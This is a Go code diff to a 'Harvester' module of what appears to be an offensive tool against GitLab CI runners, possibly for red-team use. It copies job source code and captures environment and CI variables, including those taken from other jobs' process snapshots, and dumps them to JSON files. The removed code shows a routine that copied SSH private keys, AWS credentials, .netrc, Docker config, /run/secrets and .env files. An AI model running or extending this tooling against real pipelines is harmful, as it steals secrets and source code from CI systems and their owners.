@@ -13,16 +13,17 @@ import (
 	"github.com/rs/zerolog/log"
 )
 
-// Harvester collects source code, credentials, and environment variables from CI jobs.
+// Harvester collects source code and environment variables from CI jobs.
 type Harvester struct {
-	outputDir   string
-	scanSecrets bool
-	gitlabURL   string
+	outputDir    string
+	scanSecrets  bool
+	gitlabURL    string
+	harvestFiles bool
 }
 
 // New creates a new Harvester.
-func New(outputDir string, scanSecrets bool, gitlabURL string) *Harvester {
-	return &Harvester{outputDir: outputDir, scanSecrets: scanSecrets, gitlabURL: gitlabURL}
+func New(outputDir string, scanSecrets bool, gitlabURL string, harvestFiles bool) *Harvester {
+	return &Harvester{outputDir: outputDir, scanSecrets: scanSecrets, gitlabURL: gitlabURL, harvestFiles: harvestFiles}
 }
 
 // JobData holds all harvested information for a single CI job.
@@ -32,24 +33,42 @@ type JobData struct {
 	SourceDir    string            `json:"source_dir"`
 	EnvVars      map[string]string `json:"env_vars"`
 	CIVars       map[string]string `json:"ci_vars"`
-	CredFiles    []string          `json:"cred_files"`
 	ScanFindings []scanner.Finding `json:"scan_findings,omitempty"`
 }
 
 // HarvestJob harvests a specific job build directory.
 func (h *Harvester) HarvestJob(jobDir string) error {
 	jobID := deriveJobID(jobDir)
-	return h.harvest(jobID, jobDir)
+	return h.harvest(jobID, jobDir, collectEnvVars())
 }
 
-// HarvestCurrentEnv harvests the current process environment (for when we are
-// already inside a CI job).
-func (h *Harvester) HarvestCurrentEnv(jobID string) error {
-	projectDir := os.Getenv("CI_PROJECT_DIR")
-	return h.harvest(jobID, projectDir)
+// HarvestProcess harvests a job discovered from a host process snapshot.
+func (h *Harvester) HarvestProcess(jobID string, env map[string]string, cmdline string) error {
+	_ = cmdline
+	if jobID == "" {
+		return fmt.Errorf("job id is required")
+	}
+	if env == nil {
+		env = map[string]string{}
+	}
+	sourceDir := strings.TrimSpace(env["CI_PROJECT_DIR"])
+	return h.harvest(jobID, sourceDir, env)
 }
 
-func (h *Harvester) harvest(jobID, sourceDir string) error {
+func (h *Harvester) harvest(jobID, sourceDir string, envVars map[string]string) error {
+	if !h.harvestFiles {
+		if h.scanSecrets {
+			findings, err := scanner.Scan(envVars, sourceDir, h.gitlabURL)
+			if err != nil {
+				log.Warn().Err(err).Str("job_id", jobID).Msg("Secret scan failed")
+			} else {
+				log.Info().Str("job_id", jobID).Int("findings", len(findings)).Msg("Secret scan complete (scan-only mode)")
+			}
+		}
+		log.Info().Str("job_id", jobID).Msg("Harvest complete (scan-only mode; no files written)")
+		return nil
+	}
+
 	ts := time.Now()
 	destRoot := filepath.Join(h.outputDir, fmt.Sprintf("%s_%s", jobID, ts.Format("20060102_150405")))
 
@@ -61,8 +80,8 @@ func (h *Harvester) harvest(jobID, sourceDir string) error {
 		JobID:     jobID,
 		Timestamp: ts,
 		SourceDir: sourceDir,
-		EnvVars:   collectEnvVars(),
-		CIVars:    collectCIVars(),
+		EnvVars:   envVars,
+		CIVars:    collectCIVarsFromMap(envVars),
 	}
 
 	// Copy source code.
@@ -75,9 +94,6 @@ func (h *Harvester) harvest(jobID, sourceDir string) error {
 		}
 	}
 
-	// Harvest credential files.
-	data.CredFiles = harvestCredentialFiles(destRoot)
-
 	// Secret scanning.
 	if h.scanSecrets {
 		findings, err := scanner.Scan(data.EnvVars, destRoot, h.gitlabURL)
@@ -87,6 +103,12 @@ func (h *Harvester) harvest(jobID, sourceDir string) error {
 			data.ScanFindings = findings
 			log.Info().Int("findings", len(findings)).Msg("Secret scan complete")
 		}
+	}
+
+	// Persist full env snapshots for each detected job run after scanning to
+	// avoid re-detecting env values from generated output files.
+	if err := writeEnvSnapshots(destRoot, data.EnvVars, data.CIVars); err != nil {
+		log.Warn().Err(err).Msg("Failed to write environment snapshots")
 	}
 
 	// Write summary JSON.
@@ -100,9 +122,6 @@ func (h *Harvester) harvest(jobID, sourceDir string) error {
 }
 
 func deriveJobID(jobDir string) string {
-	if id := os.Getenv("CI_JOB_ID"); id != "" {
-		return id
-	}
 	return filepath.Base(jobDir)
 }
 
@@ -116,9 +135,12 @@ func collectEnvVars() map[string]string {
 }
 
 func collectCIVars() map[string]string {
+	return collectCIVarsFromMap(collectEnvVars())
+}
+
+func collectCIVarsFromMap(source map[string]string) map[string]string {
 	m := make(map[string]string)
-	for _, e := range os.Environ() {
-		k, v, _ := strings.Cut(e, "=")
+	for k, v := range source {
 		if strings.HasPrefix(k, "CI_") || strings.HasPrefix(k, "GITLAB_") {
 			m[k] = v
 		}
@@ -126,55 +148,23 @@ func collectCIVars() map[string]string {
 	return m
 }
 
-// harvestCredentialFiles looks for common credential files and copies them to destRoot/creds/.
-func harvestCredentialFiles(destRoot string) []string {
-	home, _ := os.UserHomeDir()
-	candidates := []string{
-		filepath.Join(home, ".netrc"),
-		filepath.Join(home, ".aws", "credentials"),
-		filepath.Join(home, ".aws", "config"),
-		filepath.Join(home, ".ssh", "id_rsa"),
-		filepath.Join(home, ".ssh", "id_ed25519"),
-		filepath.Join(home, ".ssh", "id_ecdsa"),
-		filepath.Join(home, ".ssh", "config"),
-		filepath.Join(home, ".docker", "config.json"),
-		"/run/secrets",
+func writeEnvSnapshots(destRoot string, envVars, ciVars map[string]string) error {
+	if err := writeMapJSON(filepath.Join(destRoot, "env_vars.json"), envVars); err != nil {
+		return err
 	}
+	return writeMapJSON(filepath.Join(destRoot, "ci_vars.json"), ciVars)
+}
 
-	// Recursively search for .env files in the current working directory.
-	if cwd, err := os.Getwd(); err == nil {
-		_ = filepath.WalkDir(cwd, func(path string, d os.DirEntry, err error) error {
-			if err == nil && !d.IsDir() && d.Name() == ".env" {
-				candidates = append(candidates, path)
-			}
-			return nil
-		})
+func writeMapJSON(path string, data map[string]string) error {
+	f, err := os.Create(path)
+	if err != nil {
+		return err
 	}
+	defer f.Close()
 
-	credDir := filepath.Join(destRoot, "creds")
-	var found []string
-
-	for _, c := range candidates {
-		info, err := os.Stat(c)
-		if err != nil {
-			continue
-		}
-		if err := os.MkdirAll(credDir, 0700); err != nil {
-			continue
-		}
-		dest := filepath.Join(credDir, filepath.Base(c))
-		if info.IsDir() {
-			if err := copyDir(c, filepath.Join(credDir, filepath.Base(c))); err == nil {
-				found = append(found, c)
-			}
-		} else {
-			if err := copyFile(c, dest); err == nil {
-				found = append(found, c)
-				log.Info().Str("file", c).Msg("Credential file harvested")
-			}
-		}
-	}
-	return found
+	enc := json.NewEncoder(f)
+	enc.SetIndent("", "  ")
+	return enc.Encode(data)
 }
 
 func writeSummary(path string, data JobData) error {
